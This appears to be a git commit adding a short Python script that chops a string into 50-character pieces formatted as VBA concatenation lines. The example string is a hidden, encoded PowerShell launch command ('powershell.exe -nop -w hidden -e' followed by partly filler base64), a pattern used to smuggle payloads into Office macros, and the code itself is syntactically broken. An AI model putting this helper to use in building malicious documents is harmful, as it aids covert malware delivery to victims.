d5108ff15a03cee0bbf4770ffd8d3225278e20fb
abhi0X01 <quicksilver0x01@gmail.com>
2022-04-02 22:30:08 -0700

    A simple python script to split a string

---
+++ split-base64.py
@@ -0,0 +1,7 @@
+#!/usr/bin/python3.7
+
+#A simple python script to split a string
+str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3ACadhoasdfasdoffhfoahfaosfhaohfasoifhasoihaosidfah"
+n = 50
+for i in range(0, len(str), n):
+print "Str = Str + " + '"' + str[i:i+n] + '"'
